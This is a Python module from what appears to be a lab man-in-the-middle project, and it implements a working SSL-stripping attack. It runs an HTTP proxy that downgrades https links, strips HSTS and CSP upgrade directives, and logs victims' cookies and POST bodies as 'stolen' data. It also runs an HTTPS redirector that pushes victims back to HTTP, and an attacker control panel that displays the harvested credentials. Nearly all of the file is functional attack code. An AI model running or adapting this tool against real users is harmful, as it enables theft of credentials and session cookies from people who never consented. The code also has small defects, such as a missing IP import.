"""
src/attacks/ssl_strip.py

SSL STRIPPING (Downgrade HTTPS -> HTTP).

Threat model (your VM topology):
- Victim browses https://fbi.confidential or clicks links to it.
- DNS spoofing makes fbi.confidential resolve to the ATTACKER IP.
- ARP spoofing enables MITM routing (and keeps traffic stable)
- Victim reaches the attacker when requesting the domain.

What this module does:
1) HTTP stripping proxy (port 80):
   - Victim requests httpss://fbi.confidential/...
   - Attacker rewrites any "https://fbi.confidential/..." links in HTML/CSS/JS
     into "http://fbi.confidential/..." so the victim stays on HTTP.
   - Attacker forwards cookies/headers and logs evidence.

2) HTTPS redirector (port 443):
   - If victim tries https://fbi.confidential/...
   - Attacker answers on 443 and returns 301 Location: http://fbi.confidential/...
   - This “pushes” the victim back to HTTP.

Attacker capability gained:
- Once the victim is kept on HTTP, the attacker can:
  - passively sniff credentials/cookies,
  - tamper with responses because content is not protected by TLS.

Trigger:
- Victim visits https://fbi.confidential while DNS points to attacker.
"""

from __future__ import annotations

import os
import re
import ssl
import time
import threading
import http.server
import socket
from dataclasses import dataclass
from datetime import datetime
from typing import Dict, Iterable, Optional
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from scapy.all import sniff

import requests


# Helpers
HOP_BY_HOP_HEADERS = {
    "connection",
    "keep-alive",
    "proxy-authenticate",
    "proxy-authorization",
    "te",
    "trailers",
    "transfer-encoding",
    "upgrade",
    "content-length",
    "content-encoding",
}

TEXTUAL_CT_HINTS = (
    "text/html",
    "text/css",
    "application/javascript",
    "application/x-javascript",
    "text/javascript",
    "application/json",
    "text/plain",
    "application/xml",
    "text/xml",
)

class Colors:
    RESET = "\033[0m"       # Reset color to default
    BOLD = "\033[1m"        # Bold text
    UNDERLINE = "\033[4m"   # Underlined text
    RED = "\033[31m"        # Red text
    GREEN = "\033[32m"      # Green text
    YELLOW = "\033[33m"     # Yellow text
    BLUE = "\033[34m"       # Blue text
    MAGENTA = "\033[35m"    # Magenta text
    CYAN = "\033[36m"       # Cyan text
    WHITE = "\033[37m"      # White text


def log_with_color(msg: str, color: str) -> None:
    """Print messages with colors."""
    print(f"{color}{msg}{Colors.RESET}")

def _now() -> str:
    return datetime.now().strftime("%H:%M:%S")

def _safe_decode(b: bytes) -> str:
    # best-effort decode for rewriting
    for enc in ("utf-8", "latin-1"):
        try:
            return b.decode(enc)
        except Exception:
            pass
    return b.decode("utf-8", errors="ignore")

def _is_textual(content_type: str) -> bool:
    ct = (content_type or "").lower()
    return any(h in ct for h in TEXTUAL_CT_HINTS)

def _script_dir() -> str:
    return os.path.dirname(os.path.abspath(__file__))

def _abs_path_if_exists(p: str) -> str:
    # allow relative paths in the repo
    if os.path.isabs(p):
        return p
    cand = os.path.join(_script_dir(), p)
    return cand if os.path.exists(cand) else p

def _port_available(host: str, port: int) -> bool:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        return True
    except OSError:
        return False
    finally:
        try:
            s.close()
        except Exception:
            pass


@dataclass
class SSLStripConfig:
    domain: str
    real_ip: str
    http_port: int = 80
    https_port: int = 443
    bind_host: str = ""
    certfile: str = "fbi.crt"
    keyfile: str = "fbi.key"
    audit_log: str = "sslstrip_audit.log"
    upstream_timeout: int = 8
    max_body_log_bytes: int = 2048


# Core rewriting logic
class ContentRewriter:
    """
    Rewrites HTTPS links to HTTP for the attacked domain, in:
    - HTML/CSS/JS/text responses
    - Location headers
    Also strips headers that would force HTTPS (HSTS) or auto-upgrade (some CSP directives).
    """

    def __init__(self, domain: str):
        self.domain = domain.strip().rstrip(".")
        self.https_prefix = f"https://{self.domain}"
        self.http_prefix = f"http://{self.domain}"

        # common variants that appear in HTML attributes
        # also handle protocol-relative URLs: //fbi.confidential/...
        self._rx_protocol_relative = re.compile(rf"(?i)//{re.escape(self.domain)}")

        # "upgrade-insecure-requests" can force browsers to upgrade http->https
        self._rx_csp_upgrade = re.compile(r"(?i)\bupgrade-insecure-requests\b")

    def rewrite_location(self, value: str) -> str:
        if not value:
            return value
        v = value
        if v.startswith(self.https_prefix):
            v = self.http_prefix + v[len(self.https_prefix):]
        # protocol-relative
        v = self._rx_protocol_relative.sub(f"//{self.domain}", v)
        return v

    def filter_response_headers(self, headers: Dict[str, str]) -> Dict[str, str]:
        out = {}
        for k, v in headers.items():
            lk = k.lower()

            # kill HSTS so browser doesn’t force https in future loads
            if lk == "strict-transport-security":
                continue

            # some Cloud Service Providers can auto-upgrade to https; remove the upgrade token if present
            if lk == "content-security-policy" and self._rx_csp_upgrade.search(v or ""):
                v = self._rx_csp_upgrade.sub("", v).strip()
                if not v:
                    continue

            # rewrite redirects
            if lk == "location":
                v = self.rewrite_location(v)

            out[k] = v
        return out

    def rewrite_body(self, body: bytes, content_type: str) -> bytes:
        if not body or not _is_textual(content_type):
            return body

        s = _safe_decode(body)

        # Inject a warning banner at the bottom of every response
        banner = """
        <div style="position:fixed;bottom:0;width:100%;background:red;color:white;text-align:center;">
            ⚠ This connection has been downgraded by an attacker.
        </div>
        """

        # 1) absolute https links for our domain -> http
        s = s.replace(self.https_prefix, self.http_prefix)

        # 2) protocol-relative //domain -> http://domain
        s = self._rx_protocol_relative.sub(self.http_prefix, s)

        s += banner
        return s.encode("utf-8", errors="ignore")


# HTTP proxy handler (stripping)
class SSLStripProxyHandler(http.server.BaseHTTPRequestHandler):
    """
    Victim connects here over HTTP (port 80).
    We forward upstream to the real HTTPS server and rewrite the response to keep victim on HTTP.
    """

    server_version = "SSLStripProxy/1.0"

    def do_GET(self):
        self.server.audit(f"STOLEN GET request: {self.path}")  # Log the GET request path
        cookies = self.headers.get('Cookie')
        if cookies:
            self.server.audit(f"Cookies: {cookies}")  # Log cookies
        
        self.server._loot_seen.set()
        self._handle()
    def do_POST(self):
        body = self.rfile.read(int(self.headers.get('Content-Length', 0)))
        self.server.audit(f"STOLEN POST DATA: {body.decode(errors='ignore')}")  # Log POST data
        self._handle()
    def do_PUT(self):     self._handle()
    def do_DELETE(self):  self._handle()
    def do_HEAD(self):    self._handle(head_only=True)
    def do_OPTIONS(self): self._handle()

    def _handle(self, head_only: bool = False):
        cfg: SSLStripConfig = self.server.cfg  # type: ignore[attr-defined]
        session: requests.Session = self.server.session  # type: ignore[attr-defined]
        rw: ContentRewriter = self.server.rewriter  # type: ignore[attr-defined]

        # Upstream URL uses IP to avoid relying on external DNS
        upstream_url = f"https://{cfg.real_ip}{self.path}"

        # Read request body if present
        body = None
        try:
            if "Content-Length" in self.headers:
                n = int(self.headers.get("Content-Length", "0") or "0")
                if n > 0:
                    body = self.rfile.read(n)
        except Exception:
            body = None

        # Build upstream headers
        req_headers = {}
        for k, v in self.headers.items():
            lk = k.lower()
            if lk in HOP_BY_HOP_HEADERS:
                continue
            # Victim uses Host=fbi.confidential
            if lk == "host":
                req_headers["Host"] = cfg.domain
            else:
                req_headers[k] = v

        # Evidence log
        self.server.audit(f"HTTP {self.command} {self.path}  from={self.client_address[0]}")  # type: ignore[attr-defined]

        # Forward upstream
        try:
            resp = session.request(
                method=self.command,
                url=upstream_url,
                headers=req_headers,
                data=body,
                allow_redirects=False,
                verify=False,
                timeout=cfg.upstream_timeout,
                stream=True,
            )

            # Read upstream body
            raw = resp.content or b""
            ct = resp.headers.get("Content-Type", "")

            # Rewrite body + headers
            new_body = rw.rewrite_body(raw, ct)
            new_headers = rw.filter_response_headers(dict(resp.headers))

            self.send_response(resp.status_code)

            for k, v in new_headers.items():
                lk = k.lower()
                if lk in HOP_BY_HOP_HEADERS:
                    continue
                if lk == "server":
                    continue
                self.send_header(k, v)

            self.send_header("Content-Length", str(0 if head_only else len(new_body)))
            self.end_headers()

            if not head_only:
                self.wfile.write(new_body)

            # Extra evidence: show when we actively downgraded something
            if b"https://" in raw and b"http://" in new_body:
                self.server.audit("Rewriter: downgraded https->http references in response body")  # type: ignore[attr-defined]

            if self.command in {"POST", "PUT"} and body:
                snippet = body[: cfg.max_body_log_bytes]
                self.server.audit(f"Upstream {self.command} body (snippet): {snippet!r}")  # type: ignore[attr-defined]

        except requests.RequestException as e:
            self.server.audit(f"[ERROR] Upstream request failed: {e}")  # type: ignore[attr-defined]
            self.send_error(502, f"Bad Gateway (upstream error): {e}")
        except Exception as e:
            self.server.audit(f"[ERROR] Proxy exception: {e}")  # type: ignore[attr-defined]
            self.send_error(500, f"Proxy error: {e}")

    def log_message(self, fmt, *args):
        # quiet: we do our own audit logging
        return


# HTTPS redirect handler (downgrade push)
class HTTPSDowngradeRedirectHandler(http.server.BaseHTTPRequestHandler):
    """
    Victim connects here over HTTPS (port 443) if they try https://domain.
    We return 301 to http://domain/... to push them back to HTTP.
    """

    server_version = "SSLStripRedirect/1.0"

    def do_GET(self):     self._redirect()
    def do_POST(self):    self._redirect()
    def do_PUT(self):     self._redirect()
    def do_DELETE(self):  self._redirect()
    def do_HEAD(self):    self._redirect(head_only=True)

    def _redirect(self, head_only: bool = False):
        cfg: SSLStripConfig = self.server.cfg  # type: ignore[attr-defined]
        location = f"http://{cfg.domain}{self.path}"

        self.server.audit(f"HTTPS redirect: {self.client_address[0]} {self.command} {self.path} -> {location}")  # type: ignore[attr-defined]

        self.send_response(301)
        self.send_header("Location", location)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def log_message(self, fmt, *args):
        return


# Threaded attack controller
class SSLStripAttack(threading.Thread):
    """
    Starts two servers:
    - HTTP stripping proxy on :80
    - HTTPS redirector on :443 (TLS)

    Stop via .stop()
    """

    def __init__(self, domain: str, real_ip: str, http_port: int = 80, https_port: int = 443):
        super().__init__(daemon=True)
        self.cfg = SSLStripConfig(domain=domain.strip().rstrip("."), real_ip=real_ip, http_port=http_port, https_port=https_port)
        self._stop = threading.Event()

        # shared session for upstream performance
        self._session = requests.Session()
        self._rewriter = ContentRewriter(self.cfg.domain)

        self.stats = {
            'top_src': None,
            'top_dst': None,
            'seen_packets': 0
        }

        self._loot_seen = threading.Event()

        # traffic stats (passive)
        self._talker_src: Dict[str, int] = {}
        self._talker_dst: Dict[str, int] = {}
        self._seen_packets = 0

        # server objects
        self._httpd: Optional[http.server.ThreadingHTTPServer] = None
        self._httpsd: Optional[http.server.ThreadingHTTPServer] = None

        # audit path
        self._audit_path = os.path.join(os.getcwd(), self.cfg.audit_log)

    def audit(self, msg: str, color: str = Colors.RESET):
        """
        Enhanced audit function that accepts color formatting.
        """
        line = f"[SSLSTRIP] [{_now()}] {msg}"
        colored_line = f"{color}{line}{Colors.RESET}"
        print(colored_line)  # Print in the desired color to the terminal
        try:
            with open(self._audit_path, "a", encoding="utf-8") as f:
                f.write(line + "\n")  # Write the plain text to the log file (no color in file)
        except Exception as e:
            print(f"[ERROR] Failed to write to audit log: {e}")

    def _start_http_proxy(self):
        cfg = self.cfg
        if not _port_available(cfg.bind_host, cfg.http_port):
            raise OSError(
                f"HTTP port {cfg.http_port} is already in use. "
                f"Stop the service using it (e.g., http_insecure_site.py) or change http_port."
            )

        self._httpd = http.server.ThreadingHTTPServer((cfg.bind_host, cfg.http_port), SSLStripProxyHandler)
        self._httpd.cfg = cfg            # type: ignore[attr-defined]
        self._httpd.session = self._session  # type: ignore[attr-defined]
        self._httpd.rewriter = self._rewriter  # type: ignore[attr-defined]
        self._httpd._loot_seen = self._loot_seen
        self._httpd.audit = self.audit   # type: ignore[attr-defined]
        self._httpd.timeout = 0.5

        self.audit(f"HTTP stripping proxy listening on :{cfg.http_port}")

        while not self._stop.is_set():
            self._httpd.handle_request()

        try:
            self._httpd.server_close()
        except Exception:
            pass
        self.audit("HTTP proxy stopped")

    def _start_https_redirector(self):
        cfg = self.cfg

        if not _port_available(cfg.bind_host, cfg.https_port):
            raise OSError(
                f"HTTPS port {cfg.https_port} is already in use. "
                f"Stop the service using it or change https_port."
            )

        certfile = _abs_path_if_exists(cfg.certfile)
        keyfile = _abs_path_if_exists(cfg.keyfile)

        if not (os.path.exists(certfile) and os.path.exists(keyfile)):
            raise FileNotFoundError(
                f"Missing cert/key for HTTPS redirector. Expected:\n"
                f"  certfile={certfile}\n"
                f"  keyfile={keyfile}\n\n"
                f"Fix: generate a self-signed cert for {cfg.domain} (lab) and place files there."
            )

        self._httpsd = http.server.ThreadingHTTPServer((cfg.bind_host, cfg.https_port), HTTPSDowngradeRedirectHandler)
        self._httpsd.cfg = cfg          # type: ignore[attr-defined]
        self._httpsd.audit = self.audit # type: ignore[attr-defined]
        self._httpsd.timeout = 0.5

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=certfile, keyfile=keyfile)
        self._httpsd.socket = ctx.wrap_socket(self._httpsd.socket, server_side=True)

        self.audit(f"HTTPS downgrade redirector listening on :{cfg.https_port} (TLS)")

        while not self._stop.is_set():
            self._httpsd.handle_request()

        try:
            self._httpsd.server_close()
        except Exception:
            pass
        self.audit("HTTPS redirector stopped")

    def _traffic_sniff_callback(self, pkt):
        """
        Passive traffic observer for stats only.
        No verification, no ARP logic.
        """
        if self._stop.is_set():
            return

        try:
            # Only capture IP packets
            if pkt.haslayer(IP):
                # Get source and destination IP addresses
                src = pkt[IP].src
                dst = pkt[IP].dst

                # Update packet counts
                self.stats['seen_packets'] += 1

                # Increment counts for source and destination IPs
                self._talker_src[src] = self._talker_src.get(src, 0) + 1
                self._talker_dst[dst] = self._talker_dst.get(dst, 0) + 1

                # Optional: Print IP addresses for debugging
                print(f"Captured packet: {src} -> {dst}")

        except Exception as e:
            print(f"Error processing packet: {e}")



    def _update_top_talkers(self):
        """
        Update the top talkers (source and destination IPs) based on traffic.
        This function analyzes the data captured and identifies the most active
        source and destination IP addresses.
        """
        if self._talker_src:
            self.stats['top_src'] = max(self._talker_src.items(), key=lambda kv: kv[1])[0]
        else:
            self.stats['top_src'] = None

        if self._talker_dst:
            self.stats['top_dst'] = max(self._talker_dst.items(), key=lambda kv: kv[1])[0]
        else:
            self.stats['top_dst'] = None

        # Print the top source and destination IPs
        print(f"Top source IP: {self.stats['top_src']}")
        print(f"Top destination IP: {self.stats['top_dst']}")



    def control_panel(self):
        while not self._stop.is_set():
            try:
                print("\n" + "=" * 84)
                log_with_color("ATTACKER CONTROL PANEL — SSL STRIP (Downgrade HTTPS -> HTTP)", Colors.YELLOW);
                print("=" * 84)
                print("1) Show stolen POST data and cookies")
                print("2) View real-time stats and logs")
                print("3) Show top talkers (most traffic source/destination)")
                print("4) Quit panel (continue SSL strip)")
                choice = input("\nSelect [1-4]: ").strip()

                if choice == "1":
                    log_with_color("\n--- STOLEN DATA (cookies / credentials) ---", Colors.CYAN);
                    try:
                        with open(self._audit_path, "r", encoding="utf-8") as f:
                            for line in f:
                                if (
                                    "STOLEN GET request" in line
                                    or "STOLEN POST DATA" in line
                                    or "Cookies:" in line
                                ):
                                    print(line.rstrip())
                    except FileNotFoundError:
                        print("[!] No audit log found yet.")


                elif choice == "2":
                    print("\n--- SSL STRIP STATUS ---")
                    print(f"Domain        : {self.cfg.domain}")
                    print(f"HTTP proxy    : {self.cfg.http_port}")
                    print(f"HTTPS redirect: {self.cfg.https_port}")
                    print(f"Audit log     : {self._audit_path}")
                    
                elif choice == "3":
                    self._update_top_talkers()

                elif choice == "4":
                    print("Control panel closed.")
                    return

                else:
                    print("Invalid choice. Try again.")

            except KeyboardInterrupt:
                print("\nControl panel interrupted.")
                return


    def run(self):
        cfg = self.cfg

        self.audit("=" * 72)
        self.audit("SSL STRIPPING (Downgrade) STARTED", Colors.BOLD + Colors.RED)
        self.audit(f"Domain        : {cfg.domain}")
        self.audit(f"Upstream HTTPS : https://{cfg.real_ip}:443 (Host header preserved as {cfg.domain})")
        self.audit(f"HTTP proxy     : :{cfg.http_port}  (victim should end up here)")
        self.audit(f"HTTPS redirect : :{cfg.https_port} (push victim -> http)")
        self.audit(f"Audit log      : {self._audit_path}")
        self.audit("=" * 72)

        # Run both servers concurrently
        t_http = threading.Thread(target=self._start_http_proxy, daemon=True)
        t_https = threading.Thread(target=self._start_https_redirector, daemon=True)

        # Start HTTPS first so “https://domain” is handled immediately
        t_https.start()
        time.sleep(0.15)
        t_http.start()

        threading.Thread(
            target=lambda: sniff(
                prn=self._traffic_sniff_callback,
                store=0,
                stop_filter=lambda _: self._stop.is_set()
            ),
            daemon=True
        ).start()
        
        self.audit("Waiting for victim credentials...")
        self._loot_seen.wait()
        self.audit("Credentials captured — enabling control panel.", Colors.GREEN);
        self.control_panel()

        # Wait until stop
        while not self._stop.is_set():
            time.sleep(0.2)
        
        t_http.join(timeout=2)
        t_https.join(timeout=2)

        self.audit("SSL STRIPPING FINISHED")

    def stop(self):
        self.audit("Stop requested")
        self._stop.set()


def start_sslstrip(domain: str = "fbi.confidential", real_ip: str = "127.0.0.1"):
    """
    Entry point used by mitm_pipeline.py
    """
    try:
        attack = SSLStripAttack(domain=domain, real_ip=real_ip)
        attack.start()
        return attack
    except Exception as e:
        print(f"[CRITICAL] Failed to start SSLStripAttack: {e}")
        return None


if __name__ == "__main__":
    print("Starting SSL Strip (lab demo). Press Ctrl+C to stop.")
    a = start_sslstrip()
    if not a:
        raise SystemExit(1)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        a.stop()
        a.join(timeout=3)
        print("Stopped.")
